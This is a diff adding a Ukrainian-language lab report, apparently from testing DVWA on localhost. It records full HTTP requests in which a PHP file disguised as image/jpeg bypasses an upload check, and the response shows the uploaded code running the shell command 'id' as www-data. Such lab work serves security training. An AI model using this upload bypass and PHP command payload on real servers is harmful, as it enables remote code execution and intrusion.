@@ -1,0 +1,65 @@
+# V2. Обхід перевірки Content-Type → RCE
+
+Рівень безпеки DVWA: medium
+
+Результат: ЕКСПЛУАТОВАНО (RGR-V8-1337 id: uid=33(www-data) gid=33(www-data) groups=33(www-data))
+
+
+
+### Завантаження .php із Content-Type: image/jpeg
+>>> POST http://127.0.0.1:8081/vulnerabilities/upload/
+>>> Content-Type: multipart/form-data; boundary=0c8f52da2362db25b492ce215ccf14c5
+>>> Cookie: security=medium; PHPSESSID=7d91887d6f5299991485ca43ff0bcaa5
+>>>
+--0c8f52da2362db25b492ce215ccf14c5
+Content-Disposition: form-data; name="Upload"
+
+Upload
+--0c8f52da2362db25b492ce215ccf14c5
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+100000
+--0c8f52da2362db25b492ce215ccf14c5
+Content-Disposition: form-data; name="uploaded"; filename="rgr_v2_1d4250a5.php"
+Content-Type: image/jpeg
+
+<?php echo "RGR-V8-" . (7*191) . " id: " . trim((string) shell_exec("id")); ?>
+--0c8f52da2362db25b492ce215ccf14c5--
+
+<<< HTTP 200 OK
+<<< Content-Type: text/html;charset=utf-8
+<<< Content-Length: 1506
+<<< (фрагмент тіла; HTML-теги прибрано для читабельності)
+jection (Blind)
+Weak Session IDs
+XSS (DOM)
+XSS (Reflected)
+XSS (Stored)
+CSP Bypass
+JavaScript Attacks
+Authorisation Bypass
+Open HTTP Redirect
+Cryptography
+API
+DVWA Security
+PHP Info
+About
+Logout
+	Vulnerability: File Upload
+			Choose an image to upload:
+		../../hackable/uploads/rgr_v2_1d4250a5.php succesfully uploaded!
+	More Information
+		https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+		https://www.acunetix.com/websitesecurity/upload-forms-threat/
+				  Username: adminSecurity Level: mediumLocale: enSQLi DB: mysql
+				Damn Vulnerable Web Application (DVWA)
+
+
+### Звернення до файлу
+>>> GET http://127.0.0.1:8081/hackable/uploads/rgr_v2_1d4250a5.php
+>>> Cookie: security=medium; PHPSESSID=7d91887d6f5299991485ca43ff0bcaa5
+<<< HTTP 200 OK
+<<< Content-Type: text/html; charset=UTF-8
+<<< Content-Length: 63
+<<< (фрагмент тіла; HTML-теги прибрано для читабельності)
+RGR-V8-1337 id: uid=33(www-data) gid=33(www-data) groups=33(www-data)
